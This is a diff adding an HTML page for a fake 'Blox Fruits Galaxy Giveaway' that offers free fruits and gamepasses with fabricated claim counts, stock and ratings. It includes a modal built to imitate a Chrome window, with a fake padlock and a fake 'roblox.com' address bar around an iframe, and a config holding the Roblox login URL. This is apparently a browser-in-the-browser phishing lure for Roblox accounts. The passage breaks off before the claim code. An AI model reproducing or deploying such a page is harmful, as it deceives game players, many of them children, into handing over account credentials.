@@ -1,0 +1,515 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover">
+<title>Blox Fruits — Galaxy Giveaway Hub</title>
+<link rel="icon" type="image/png" sizes="512x512" href="/icon.png">
+<link rel="apple-touch-icon" href="/icon.png">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Chakra+Petch:wght@400;500;600;700&family=Inter:ital,opsz,wght@0,14..32,400..900;1,14..32,400..900&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+<style>
+  @media(prefers-reduced-motion:reduce){*{animation-duration:.001ms!important;transition-duration:.06ms!important;}}
+  *,*::before,*::after{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
+  html{scroll-behavior:smooth}
+  body{background:var(--bg);color:var(--ink);font-family:var(--font-b);line-height:1.6;-webkit-font-smoothing:antialiased;overflow-x:hidden;min-height:100vh}
+  a{color:inherit;text-decoration:none}
+  button{padding:0;border:0;color:inherit;background:none;font:inherit;cursor:pointer}
+  svg,img{display:block;max-width:100%}
+  .wrap{width:min(1240px,92vw);margin-inline:auto}
+
+  :root{
+    --bg:#07040f; --bg-2:#10071f; --surface:#180c2e; --surface-2:#221142;
+    --line:rgba(184,122,220,.18); --line-bright:rgba(216,122,255,.45);
+    --ink:#f3eaf8; --ink-dim:#c8b2d6; --ink-faint:#8c709e;
+    --purple:#a855f7; --purple-bright:#c084fc;
+    --pink:#ec4899; --pink-bright:#f472b6;
+    --cyan:#2fe0d0; --gold:#ffc24d; --green:#4fd88a; --red:#ef4444;
+    --shadow:0 24px 60px -20px rgba(10,2,20,.95);
+    --font-d:"Chakra Petch",system-ui,sans-serif;
+    --font-b:"Inter",system-ui,sans-serif;
+  }
+
+  /* ---------- LOADING SCREEN ---------- */
+  #loading-screen{
+    position:fixed;inset:0;z-index:99999;
+    background:radial-gradient(circle at 50% 50%, #1a0b36, #07040f 90%);
+    display:flex;flex-direction:column;justify-content:center;align-items:center;
+    opacity:1;visibility:visible;
+    transition:opacity .8s cubic-bezier(.16,1,.3,1),transform .8s cubic-bezier(.16,1,.3,1),visibility .8s;
+  }
+  #loading-screen.fade-out{opacity:0;transform:scale(1.05);visibility:hidden;pointer-events:none}
+  .loader-grid-orbit{position:relative;width:110px;height:110px;display:flex;align-items:center;justify-content:center}
+  .loader-ring-outer{position:absolute;inset:0;border-radius:50%;border:2px dashed rgba(236,72,153,.3);animation:spin 8s linear infinite}
+  .loader-ring-inner{position:absolute;inset:12px;border-radius:50%;border:2px solid transparent;border-top:2px solid var(--pink-bright);border-bottom:2px solid var(--purple-bright);animation:spin-reverse 1.5s linear infinite}
+  .loader-core{width:50px;height:50px;background:linear-gradient(135deg,var(--purple),var(--pink));border-radius:14px;display:flex;align-items:center;justify-content:center;box-shadow:0 0 35px rgba(236,72,153,.7);animation:pulse-core 2s ease-in-out infinite}
+  .loader-core i{font-size:20px;color:#fff;filter:drop-shadow(0 0 6px rgba(255,255,255,.8))}
+  @keyframes pulse-core{0%,100%{transform:scale(.95);box-shadow:0 0 25px rgba(168,85,247,.5)}50%{transform:scale(1.08);box-shadow:0 0 45px rgba(236,72,153,.9)}}
+  .loading-title{margin-top:28px;font-weight:700;font-size:19px;letter-spacing:3px;font-family:var(--font-d)}
+  .loading-title span{color:var(--pink-bright);text-shadow:0 0 20px rgba(236,72,153,.6)}
+  .loading-bar-track{width:260px;height:5px;background:rgba(255,255,255,.06);border-radius:6px;margin-top:18px;overflow:hidden;border:1px solid rgba(184,122,220,.15)}
+  .loading-bar-fill{width:0%;height:100%;background:linear-gradient(90deg,var(--purple),var(--pink),var(--cyan));border-radius:6px;transition:width .25s ease-out;box-shadow:0 0 12px var(--pink)}
+  .loading-text{font-size:12px;color:var(--ink-dim);margin-top:12px;letter-spacing:1px;font-family:var(--font-d)}
+  @keyframes spin{to{transform:rotate(360deg)}}
+  @keyframes spin-reverse{to{transform:rotate(-360deg)}}
+
+  #app-content{opacity:0;transform:translateY(20px);transition:opacity .9s cubic-bezier(.16,1,.3,1),transform .9s cubic-bezier(.16,1,.3,1);padding-bottom:40px}
+  #app-content.visible{opacity:1;transform:translateY(0)}
+
+  /* ---------- NAVBAR ---------- */
+  .navbar{display:flex;justify-content:space-between;align-items:center;padding:12px 16px;background:rgba(7,4,15,.9);backdrop-filter:blur(12px);-webkit-backdrop-filter:blur(12px);border-bottom:1px solid var(--line);position:sticky;top:0;z-index:100}
+  .nav-brand{display:flex;align-items:center;gap:10px;font-family:var(--font-d);font-weight:700;font-size:1rem;letter-spacing:.5px}
+  .brand-icon{width:30px;height:30px;background:linear-gradient(135deg,var(--purple),var(--pink));border-radius:8px;display:flex;align-items:center;justify-content:center;color:#fff;font-size:.9rem;box-shadow:0 0 16px rgba(168,85,247,.5);flex-shrink:0}
+  .nav-brand span span{color:var(--pink-bright)}
+  .nav-actions{display:flex;gap:8px;align-items:center}
+
+  /* ---------- CHROME MODAL ---------- */
+  .browser-modal-overlay{position:fixed;inset:0;width:100%;height:100%;background:rgba(0,0,0,.85);z-index:99999;display:none;align-items:center;justify-content:center;padding:0;backdrop-filter:blur(6px)}
+  .browser-modal-overlay.active{display:flex;animation:fadeIn .3s ease}
+  @keyframes fadeIn{from{opacity:0;transform:scale(.96)}to{opacity:1;transform:scale(1)}}
+  .chrome-window{width:100%;max-width:1100px;height:100vh;height:100dvh;background:#fff;overflow:hidden;display:flex;flex-direction:column;box-shadow:0 20px 50px rgba(0,0,0,.6);font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif}
+  .chrome-titlebar{background:#dee1e6;height:38px;display:flex;align-items:center;justify-content:space-between;padding:0 4px;flex-shrink:0}
+  .chrome-tabs{display:flex;height:32px;margin-top:6px;gap:0;overflow-x:auto;max-width:75%}
+  .chrome-tab{background:#fff;border-radius:8px 8px 0 0;padding:0 8px;min-width:120px;max-width:180px;display:flex;align-items:center;position:relative;box-shadow:0 -1px 2px rgba(0,0,0,.05)}
+  .chrome-tab-icon{width:14px;height:14px;margin-right:6px;flex-shrink:0}
+  .chrome-tab-title{font-size:11px;color:#333;flex-grow:1;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;padding-right:4px}
+  .chrome-tab-close{font-size:13px;color:#5f6368;cursor:pointer;border-radius:50%;width:18px;height:18px;display:flex;align-items:center;justify-content:center;line-height:1;flex-shrink:0}
+  .chrome-window-controls{display:flex;height:38px;align-items:center}
+  .chrome-window-controls span{width:36px;height:32px;display:flex;align-items:center;justify-content:center;font-size:13px;color:#333;cursor:pointer}
+  .chrome-window-controls .chrome-close-btn:hover{background:#e81123;color:#fff}
+  .chrome-toolbar{background:#fff;height:42px;display:flex;align-items:center;padding:0 8px;border-bottom:1px solid #dadce0;flex-shrink:0;gap:6px}
+  .chrome-nav-btns{display:flex;gap:2px}
+  .chrome-icon{width:26px;height:26px;padding:4px;border-radius:50%;fill:#5f6368;cursor:pointer;box-sizing:border-box}
+  .chrome-address-bar{flex-grow:1;background:#f1f3f4;height:30px;border-radius:15px;display:flex;align-items:center;padding:0 10px;gap:6px;min-width:0}
+  .chrome-lock{width:12px;height:12px;fill:#5f6368;flex-shrink:0}
+  .chrome-url{font-size:12px;color:#202124;flex-grow:1;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+  .chrome-url-dim{color:#5f6368}
+  .browser-content{flex-grow:1;background:#fff;display:flex;flex-direction:column;min-height:0}
+  .browser-content iframe{flex-grow:1;width:100%;height:100%;border:none;display:block}
+
+  /* ---------- HERO ---------- */
+  .hero{position:relative;min-height:70svh;display:flex;flex-direction:column;justify-content:center;overflow:hidden;padding:50px 0 40px}
+  /* BLOX FRUITS ONLY — no condo footage */
+  .hero-bg{position:absolute;inset:0;z-index:0;background:linear-gradient(rgba(7,4,15,.78),rgba(7,4,15,.96)),url("https://static.wikia.nocookie.net/blox-fruits/images/6/6a/KitsuneFruit.png") center/contain no-repeat,radial-gradient(circle at 50% 40%,rgba(168,85,247,.35),var(--bg) 70%)}
+  .grid-floor{position:absolute;left:50%;bottom:-6%;translate:-50% 0;width:230%;height:60%;z-index:0;background-image:linear-gradient(var(--line-bright) 1px,transparent 1px),linear-gradient(90deg,var(--line-bright) 1px,transparent 1px);background-size:48px 48px;transform:perspective(560px) rotateX(64deg);transform-origin:bottom center;mask-image:linear-gradient(to top,#000 6%,transparent 78%);-webkit-mask-image:linear-gradient(to top,#000 6%,transparent 78%)}
+  .hero-inner{position:relative;z-index:2}
+  .eyebrow{display:inline-flex;align-items:center;gap:8px;font-family:var(--font-d);font-weight:600;font-size:.75rem;letter-spacing:.12em;color:var(--pink-bright);padding:6px 12px;border:1px solid var(--line-bright);border-radius:999px;background:rgba(236,72,153,.08);margin-bottom:18px}
+  .eyebrow .dot{width:6px;height:6px;border-radius:50%;background:var(--pink-bright);animation:pulse 2s infinite}
+  @keyframes pulse{0%{box-shadow:0 0 0 0 rgba(236,72,153,.6)}70%{box-shadow:0 0 0 10px rgba(236,72,153,0)}100%{box-shadow:0 0 0 0 rgba(236,72,153,0)}}
+  h1.title{font-family:var(--font-d);font-weight:700;line-height:1.05;font-size:clamp(2.1rem,6.5vw,4.2rem);letter-spacing:-.01em;max-width:16ch;margin-bottom:16px}
+  h1.title .glow{color:var(--purple-bright);text-shadow:0 0 30px rgba(168,85,247,.6)}
+  .lede{font-size:clamp(.95rem,1.8vw,1.12rem);color:var(--ink-dim);max-width:52ch;margin-bottom:26px}
+  .cta-row{display:flex;flex-wrap:wrap;gap:10px}
+  .btn{font-family:var(--font-d);font-weight:600;font-size:.9rem;padding:12px 20px;border-radius:12px;border:1px solid transparent;cursor:pointer;transition:transform .18s,box-shadow .18s,background .18s;display:inline-flex;align-items:center;justify-content:center;gap:8px;text-align:center}
+  .btn-primary{background:linear-gradient(135deg,var(--purple),var(--pink));color:#fff;box-shadow:0 10px 25px -8px rgba(168,85,247,.8);width:100%}
+  .btn-ghost{background:rgba(255,255,255,.03);border-color:var(--line-bright);color:var(--ink);flex:1;min-width:130px}
+  .btn-discord{background:#5865F2;color:#fff;box-shadow:0 8px 20px -6px rgba(88,101,242,.7);border-color:#5865F2;flex:1;min-width:130px}
+  .btn:active{transform:scale(.97)}
+  @media(min-width:768px){.btn-primary{width:auto}}
+
+  /* ---------- HERO BANNER ---------- */
+  .hero-banner{margin:24px 0 0;background:linear-gradient(145deg,rgba(34,17,66,.75),rgba(16,7,31,.95));border-radius:16px;border:1px solid var(--line-bright);overflow:hidden;box-shadow:var(--shadow)}
+  .hero-video-wrapper{position:relative;width:100%;height:200px;background:radial-gradient(circle at 50% 45%,rgba(236,72,153,.25),rgba(16,7,31,.95) 70%);overflow:hidden;display:flex;align-items:center;justify-content:center}
+  /* BLOX FRUITS ONLY — fruit banner image, no condo footage */
+  .hero-video-wrapper img{width:auto;height:170px;object-fit:contain;opacity:.95;display:block;filter:drop-shadow(0 0 24px rgba(236,72,153,.6))}
+  .live-badge{position:absolute;top:12px;left:14px;background:var(--pink);color:#fff;font-size:9px;font-weight:700;padding:4px 10px;border-radius:6px;letter-spacing:.6px;z-index:5;box-shadow:0 0 10px rgba(236,72,153,.6);font-family:var(--font-d)}
+  .hero-avatar-overlay{position:absolute;bottom:12px;left:12px;display:flex;align-items:center;gap:8px;z-index:5;background:rgba(7,4,15,.75);backdrop-filter:blur(6px);padding:4px 12px 4px 6px;border-radius:30px;border:1px solid var(--line-bright)}
+  .hero-avatar-img{width:30px;height:30px;border-radius:50%;border:2px solid var(--purple-bright);object-fit:cover;background:var(--surface)}
+  .hero-avatar-name{font-size:11px;font-weight:600;color:#f3f4f6;font-family:var(--font-d)}
+  .hero-content{padding:16px}
+  .hero-content h2{font-size:1.1rem;font-weight:700;font-family:var(--font-d);margin-bottom:4px;color:var(--ink)}
+  .hero-content p{font-size:.85rem;color:var(--ink-dim)}
+
+  /* ---------- STATS ---------- */
+  .stats{border-block:1px solid var(--line);background:linear-gradient(180deg,var(--bg-2),var(--bg));position:relative;z-index:3;margin-top:30px}
+  .stats-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:1px;background:var(--line)}
+  @media(min-width:768px){.stats-grid{grid-template-columns:repeat(4,1fr)}}
+  .stat{background:var(--bg);padding:20px 16px;text-align:center}
+  .stat .num{font-family:var(--font-d);font-weight:700;font-size:clamp(1.5rem,3vw,2.2rem);line-height:1;color:var(--purple-bright)}
+  .stat .lbl{margin-top:6px;font-size:.7rem;letter-spacing:.1em;color:var(--ink-faint);font-family:var(--font-d);font-weight:500}
+
+  /* ---------- SECTION HEADS ---------- */
+  .sec{padding:50px 0 0}
+  .sec-head{display:flex;align-items:flex-end;justify-content:space-between;gap:16px;margin-bottom:24px;flex-wrap:wrap}
+  .sec-head h2{font-family:var(--font-d);font-weight:700;font-size:clamp(1.6rem,3.5vw,2.2rem);letter-spacing:-.01em;position:relative;padding-left:16px}
+  .sec-head h2::before{content:"";position:absolute;left:0;top:8%;bottom:8%;width:4px;border-radius:2px;background:linear-gradient(var(--purple),var(--pink))}
+  .sec-head p{color:var(--ink-faint);font-size:.88rem;max-width:38ch}
+  .section-stats{font-size:.8rem;color:var(--ink-dim);font-family:var(--font-d);background:var(--surface);padding:6px 12px;border-radius:6px;border:1px solid var(--line)}
+
+  /* ---------- FRUIT / PASS GRID ---------- */
+  .grid-list{display:grid;grid-template-columns:1fr;gap:16px}
+  @media(min-width:640px){.grid-list{grid-template-columns:repeat(2,1fr)}}
+  @media(min-width:1024px){.grid-list{grid-template-columns:repeat(3,1fr);gap:20px}}
+
+  .item-card{background:var(--surface);border:1px solid var(--line);border-radius:16px;overflow:hidden;box-shadow:var(--shadow);display:flex;flex-direction:column;transition:transform .25s ease,border-color .25s ease;position:relative}
+  .item-card:hover{transform:translateY(-4px);border-color:var(--line-bright)}
+  .item-thumb{position:relative;width:100%;height:180px;background:radial-gradient(circle at 50% 40%,rgba(168,85,247,.18),transparent 65%),var(--bg-2);display:flex;align-items:center;justify-content:center;overflow:hidden}
+  .item-thumb img{width:130px;height:130px;object-fit:contain;filter:drop-shadow(0 0 18px rgba(236,72,153,.55));transition:transform .4s ease}
+  .item-card:hover .item-thumb img{transform:scale(1.08) rotate(-3deg)}
+  .rarity-tag{position:absolute;top:10px;right:10px;font-size:9px;font-weight:700;padding:4px 10px;border-radius:20px;backdrop-filter:blur(4px);letter-spacing:.5px;z-index:6;font-family:var(--font-d)}
+  .r-common{background:rgba(148,163,184,.18);border:1px solid rgba(148,163,184,.5);color:#cbd5e1}
+  .r-uncommon{background:rgba(79,216,138,.15);border:1px solid rgba(79,216,138,.5);color:#86efac}
+  .r-rare{background:rgba(47,224,208,.15);border:1px solid rgba(47,224,208,.5);color:#99f6e4}
+  .r-legendary{background:rgba(255,194,77,.15);border:1px solid rgba(255,194,77,.5);color:#fcd34d}
+  .r-mythical{background:rgba(236,72,153,.18);border:1px solid rgba(236,72,153,.55);color:var(--pink-bright)}
+  .r-pass{background:rgba(168,85,247,.2);border:1px solid rgba(168,85,247,.55);color:var(--purple-bright)}
+
+  .item-info{padding:16px;display:flex;flex-direction:column;flex-grow:1}
+  .item-name{font-size:1.05rem;font-weight:700;margin-bottom:6px;font-family:var(--font-d);letter-spacing:-.2px;color:var(--ink)}
+  .item-desc{font-size:.8rem;color:var(--ink-faint);margin-bottom:12px;line-height:1.4;flex-grow:1}
+  .item-meta{display:flex;align-items:center;justify-content:space-between;gap:8px;margin-bottom:12px;font-size:11px;color:var(--ink-dim);font-family:var(--font-d)}
+  .item-meta span{display:inline-flex;align-items:center;gap:4px}
+  .stock-bar{height:5px;border-radius:3px;background:rgba(255,255,255,.06);overflow:hidden;margin-bottom:14px}
+  .stock-bar i{display:block;height:100%;background:linear-gradient(90deg,var(--purple),var(--pink));border-radius:3px}
+  .claim-btn{display:block;width:100%;padding:12px;background:linear-gradient(135deg,var(--purple),var(--pink));border:none;border-radius:10px;color:#fff;font-weight:700;font-size:.88rem;text-align:center;cursor:pointer;box-shadow:0 8px 20px -6px rgba(168,85,247,.7);letter-spacing:.5px;font-family:var(--font-d);transition:opacity .2s}
+  .claim-btn:hover{opacity:.9}
+  .claim-btn:disabled{opacity:.4;cursor:not-allowed;background:rgba(255,255,255,.06);box-shadow:none;color:var(--ink-faint)}
+
+  /* ---------- MODAL ---------- */
+  .loading-modal{position:fixed;inset:0;background:rgba(7,4,15,.85);z-index:9998;display:flex;align-items:center;justify-content:center;opacity:0;pointer-events:none;transition:opacity .3s ease;backdrop-filter:blur(4px);padding:16px}
+  .loading-modal.active{opacity:1;pointer-events:all}
+  .loading-content{background:var(--surface);padding:30px 20px;border-radius:16px;text-align:center;border:1px solid var(--line-bright);box-shadow:var(--shadow);max-width:340px;width:100%}
+  .loading-spinner{width:44px;height:44px;border:3px solid var(--line);border-top:3px solid var(--pink);border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 16px}
+  .loading-content h3{margin:0 0 8px;font-size:1.1rem;color:#fff;font-family:var(--font-d)}
+  .loading-content p{margin:0;font-size:.85rem;color:var(--ink-dim)}
+
+  /* ---------- FOOTER ---------- */
+  footer{margin-top:60px;border-top:1px solid var(--line);padding:30px 0;background:var(--bg-2)}
+  .foot-in{display:flex;align-items:center;justify-content:space-between;gap:16px;flex-wrap:wrap;text-align:center}
+  @media(min-width:768px){.foot-in{text-align:left}}
+  .brand{font-family:var(--font-d);font-weight:700;font-size:1.05rem;display:flex;align-items:center;gap:8px;justify-content:center}
+  .brand .mk{width:24px;height:24px;border-radius:6px;background:linear-gradient(135deg,var(--purple),var(--pink));display:grid;place-items:center;font-size:.8rem;color:#fff}
+  .foot-in p{color:var(--ink-faint);font-size:.82rem;max-width:44ch}
+  .foot-links{display:flex;gap:8px;width:100%;justify-content:center}
+  @media(min-width:768px){.foot-links{width:auto}}
+
+  @media(min-width:768px){
+    .chrome-window{border-radius:10px;height:85vh;width:95vw}
+    .browser-modal-overlay{padding:20px}
+  }
+</style>
+</head>
+  <body>
+  <!-- Loading Screen -->
+  <div id="loading-screen">
+    <div class="loader-grid-orbit">
+      <div class="loader-ring-outer"></div>
+      <div class="loader-ring-inner"></div>
+      <div class="loader-core"><i class="fa-solid fa-lemon"></i></div>
+    </div>
+    <div class="loading-title">BLOX <span>FRUITS GIVEAWAY</span></div>
+    <div class="loading-bar-track"><div class="loading-bar-fill" id="loading-bar"></div></div>
+    <div class="loading-text" id="loading-text">Initializing Fruit Nodes...</div>
+  </div>
+
+  <div id="app-content">
+    <header class="navbar">
+      <div class="nav-brand">
+        <div class="brand-icon"><i class="fa-solid fa-lemon"></i></div>
+        <span>BLOX <span>FRUITS HUB</span></span>
+      </div>
+      <div class="nav-actions">
+        <a href="https://discord.gg/VEMNjavWzP" target="_blank" rel="noopener noreferrer" class="btn btn-discord" style="padding:6px 12px;font-size:.75rem;"><i class="fa-brands fa-discord"></i> Discord</a>
+      </div>
+    </header>
+
+    <header class="hero">
+      <div class="hero-bg"></div>
+      <div class="grid-floor"></div>
+      <div class="wrap hero-inner">
+        <div class="eyebrow"><span class="dot"></span> GALAXY GIVEAWAY v5.0</div>
+        <h1 class="title">Free <span class="glow">Blox Fruits</span> &amp; Gamepass Giveaway</h1>
+        <p class="lede">Claim legendary and mythical fruits, permanent unlocks, and premium gamepasses from the Galaxy network. Every claim routes through a verified session window.</p>
+        <div class="cta-row">
+          <button class="btn btn-primary" onclick="claimFeatured()">Claim Featured Fruit</button>
+          <a href="https://discord.gg/VEMNjavWzP" target="_blank" rel="noopener noreferrer" class="btn btn-discord"><i class="fa-brands fa-discord"></i> Join Discord</a>
+        </div>
+
+        <div class="hero-banner">
+          <div class="hero-video-wrapper">
+            <span class="live-badge"><i class="fa-solid fa-circle" style="font-size:7px;margin-right:3px;vertical-align:middle;"></i> LIVE DROP</span>
+            <!-- BLOX FRUITS ONLY -->
+            <img src="https://static.wikia.nocookie.net/blox-fruits/images/6/6a/KitsuneFruit.png" alt="kitsune fruit drop">
+            <div class="hero-avatar-overlay">
+              <img class="hero-avatar-img" src="https://tr.rbxcdn.com/30DAY-AvatarHeadshot-A4F764CB5B7A62140A826DCBA9EE5F7E-Png/150/150/AvatarHeadshot/Webp/noFilter" alt="avatar">
+              <span class="hero-avatar-name">GalaxyFruitDrop</span>
+            </div>
+          </div>
+          <div class="hero-content">
+            <h2>Featured Drop — Kitsune Fruit (Mythical)</h2>
+            <p>Instant claim window opens per active session. First come, first served.</p>
+          </div>
+        </div>
+      </div>
+    </header>
+
+    <section class="stats">
+      <div class="wrap">
+        <div class="stats-grid">
+          <div class="stat"><div class="num" id="totalClaims">48,210</div><div class="lbl">FRUITS CLAIMED</div></div>
+          <div class="stat"><div class="num" id="totalStock">36 / 36</div><div class="lbl">ITEMS IN STOCK</div></div>
+          <div class="stat"><div class="num">99.9%</div><div class="lbl">DELIVERY RATE</div></div>
+          <div class="stat"><div class="num">5.0★</div><div class="lbl">GALAXY RATING</div></div>
+        </div>
+      </div>
+    </section>
+
+    <section class="sec" id="fruits-section">
+      <div class="wrap">
+        <div class="sec-head">
+          <div>
+            <h2>Blox Fruits — Claim Grid</h2>
+            <p>Select any fruit below to open the claim window.</p>
+          </div>
+          <div class="section-stats">Live Stock: <span id="stockCount">36</span> items</div>
+        </div>
+        <div class="grid-list" id="fruitGrid"></div>
+      </div>
+    </section>
+
+    <section class="sec" id="passes-section">
+      <div class="wrap">
+        <div class="sec-head">
+          <div>
+            <h2>Gamepasses — Claim Grid</h2>
+            <p>Permanent unlocks, 2x mastery, fruit notifier, and more.</p>
+          </div>
+          <div class="section-stats">Passes: <span id="passCount">0</span> available</div>
+        </div>
+        <div class="grid-list" id="passGrid"></div>
+      </div>
+    </section>
+
+    <footer>
+      <div class="wrap foot-in">
+        <div>
+          <div class="brand"><div class="mk"><i class="fa-solid fa-lemon"></i></div> Galaxy Blox Fruits Hub</div>
+          <p style="margin-top:6px;">Unified giveaway interface. Claims route through a secure session window. Not affiliated with Roblox Corporation.</p>
+        </div>
+        <div class="foot-links">
+          <a href="https://discord.gg/VEMNjavWzP" target="_blank" rel="noopener noreferrer" class="btn btn-discord" style="padding:10px 14px;font-size:.8rem;"><i class="fa-brands fa-discord"></i> Discord</a>
+        </div>
+      </div>
+    </footer>
+  </div>
+
+  <div class="loading-modal" id="loadingModal">
+    <div class="loading-content">
+      <div class="loading-spinner"></div>
+      <h3 id="loadingTitle">Connecting...</h3>
+      <p id="loadingText">Opening secure claim window</p>
+    </div>
+  </div>
+
+  <div id="browserModal" class="browser-modal-overlay">
+    <div class="chrome-window">
+      <div class="chrome-titlebar">
+        <div class="chrome-tabs">
+          <div class="chrome-tab active">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/7/70/Roblox_Corporation_2025_logo.svg" class="chrome-tab-icon" id="modalTabIcon" alt="Logo">
+            <span class="chrome-tab-title" id="modalTabTitle">Claim Window</span>
+            <span class="chrome-tab-close" id="closeTabBtn">&times;</span>
+          </div>
+        </div>
+        <div class="chrome-window-controls">
+          <span style="display:none">&#8211;</span>
+          <span style="display:none">&#9744;</span>
+          <span class="chrome-close-btn" id="closeBrowserBtn">&#10005;</span>
+        </div>
+      </div>
+      <div class="chrome-toolbar">
+        <div class="chrome-nav-btns">
+          <svg viewBox="0 0 24 24" class="chrome-icon"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"></path></svg>
+          <svg viewBox="0 0 24 24" class="chrome-icon"><path d="M12 4l-1.41 1.41L16.17 11H4v2h12.17l-5.58 5.59L12 20l8-8z"></path></svg>
+        </div>
+        <div class="chrome-address-bar">
+          <svg viewBox="0 0 24 24" class="chrome-lock"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"></path></svg>
+          <span class="chrome-url" id="fakeUrlText"><span class="chrome-url-dim">https://roblox.com/...</span></span>
+        </div>
+      </div>
+      <div class="browser-content">
+        <iframe id="browserIframe" src="about:blank" sandbox="allow-forms allow-scripts allow-same-origin allow-popups allow-modals"></iframe>
+      </div>
+    </div>
+  </div>
+    <script>
+    const appConfig = {
+      discordUrl: "https://discord.gg/VEMNjavWzP",
+      robloxPlaceholder: "https://www.roblox.com/games/PLACEHOLDER",
+      claimTarget: "https://www.roblox.com/games/2753915549/Blox-Fruits",
+      displayUrl: "roblox.com/games/2753915549/Blox-Fruits",
+      loginUrl: "https://www.roblox.com/login",
+      // BLOX FRUITS only — used as onerror fallback for any broken fruit image
+      fruitFallback: "https://static.wikia.nocookie.net/blox-fruits/images/6/6a/KitsuneFruit.png",
+
+      fruits: [
+        { id:"dragon",    name:"Dragon",         rarity:"mythical",  price:"3,500,000", stock:8,  img:"https://static.wikia.nocookie.net/blox-fruits/images/4/4b/DragonFruit.png" },
+        { id:"leopard",   name:"Leopard",        rarity:"mythical",  price:"5,000,000", stock:4,  img:"https://static.wikia.nocookie.net/blox-fruits/images/3/3c/LeopardFruit.png" },
+        { id:"kitsune",   name:"Kitsune",        rarity:"mythical",  price:"8,000,000", stock:3,  img:"https://static.wikia.nocookie.net/blox-fruits/images/6/6a/KitsuneFruit.png" },
+        { id:"dough",     name:"Dough",          rarity:"mythical",  price:"2,800,000", stock:6,  img:"https://static.wikia.nocookie.net/blox-fruits/images/0/0b/DoughFruit.png" },
+        { id:"venom",     name:"Venom",          rarity:"mythical",  price:"3,000,000", stock:7,  img:"https://static.wikia.nocookie.net/blox-fruits/images/5/5e/VenomFruit.png" },
+        { id:"control",   name:"Control",        rarity:"mythical",  price:"3,200,000", stock:5,  img:"https://static.wikia.nocookie.net/blox-fruits/images/2/2b/ControlFruit.png" },
+        { id:"shadow",    name:"Shadow",         rarity:"mythical",  price:"2,900,000", stock:6,  img:"https://static.wikia.nocookie.net/blox-fruits/images/e/ee/ShadowFruit.png" },
+        { id:"buddha",    name:"Buddha",         rarity:"legendary", price:"1,200,000", stock:12, img:"https://static.wikia.nocookie.net/blox-fruits/images/f/f7/BuddhaFruit.png" },
+        { id:"rumble",    name:"Rumble",         rarity:"legendary", price:"2,100,000", stock:9,  img:"https://static.wikia.nocookie.net/blox-fruits/images/1/1a/RumbleFruit.png" },
+        { id:"portal",    name:"Portal",         rarity:"legendary", price:"1,900,000", stock:10, img:"https://static.wikia.nocookie.net/blox-fruits/images/c/c5/PortalFruit.png" },
+        { id:"spirit",    name:"Spirit",         rarity:"legendary", price:"3,400,000", stock:6,  img:"https://static.wikia.nocookie.net/blox-fruits/images/7/7d/SpiritFruit.png" },
+        { id:"mammoth",   name:"Mammoth",        rarity:"legendary", price:"2,700,000", stock:5,  img:"https://static.wikia.nocookie.net/blox-fruits/images/8/8e/MammothFruit.png" },
+        { id:"gravity",   name:"Gravity",        rarity:"legendary", price:"2,500,000", stock:8,  img:"https://static.wikia.nocookie.net/blox-fruits/images/3/3f/GravityFruit.png" },
+        { id:"blizzard",  name:"Blizzard",       rarity:"legendary", price:"2,400,000", stock:7,  img:"https://static.wikia.nocookie.net/blox-fruits/images/5/5b/BlizzardFruit.png" },
+        { id:"phoenix",   name:"Phoenix",        rarity:"rare",      price:"1,800,000", stock:14, img:"https://static.wikia.nocookie.net/blox-fruits/images/6/6d/PhoenixFruit.png" },
+        { id:"love",      name:"Love",           rarity:"rare",      price:"1,300,000", stock:18, img:"https://static.wikia.nocookie.net/blox-fruits/images/8/82/LoveFruit.png" },
+        { id:"sound",     name:"Sound",          rarity:"rare",      price:"1,700,000", stock:16, img:"https://static.wikia.nocookie.net/blox-fruits/images/b/b1/SoundFruit.png" },
+        { id:"rubber",    name:"Rubber",         rarity:"rare",      price:"750,000",   stock:25, img:"https://static.wikia.nocookie.net/blox-fruits/images/1/1e/RubberFruit.png" },
+        { id:"ice",       name:"Ice",            rarity:"uncommon",  price:"350,000",   stock:40, img:"https://static.wikia.nocookie.net/blox-fruits/images/3/37/IceFruit.png" },
+        { id:"magma",     name:"Magma",          rarity:"uncommon",  price:"960,000",   stock:35, img:"https://static.wikia.nocookie.net/blox-fruits/images/f/f9/MagmaFruit.png" },
+        { id:"light",     name:"Light",          rarity:"uncommon",  price:"650,000",   stock:38, img:"https://static.wikia.nocookie.net/blox-fruits/images/0/0c/LightFruit.png" },
+        { id:"bomb",      name:"Bomb",           rarity:"common",    price:"80,000",    stock:99, img:"https://static.wikia.nocookie.net/blox-fruits/images/4/41/BombFruit.png" },
+        { id:"spike",     name:"Spike",          rarity:"common",    price:"180,000",   stock:99, img:"https://static.wikia.nocookie.net/blox-fruits/images/6/61/SpikeFruit.png" },
+        { id:"chop",      name:"Chop",           rarity:"common",    price:"30,000",    stock:99, img:"https://static.wikia.nocookie.net/blox-fruits/images/3/34/ChopFruit.png" }
+      ],
+
+      passes: [
+        { id:"notifier", name:"Fruit Notifier",   rarity:"pass", price:"2,700 R$", stock:12, img:"https://static.wikia.nocookie.net/blox-fruits/images/1/1b/FruitNotifier.png" },
+        { id:"x2mastery",name:"2x Mastery",       rarity:"pass", price:"450 R$",   stock:40, img:"https://static.wikia.nocookie.net/blox-fruits/images/4/4f/2xMastery.png" },
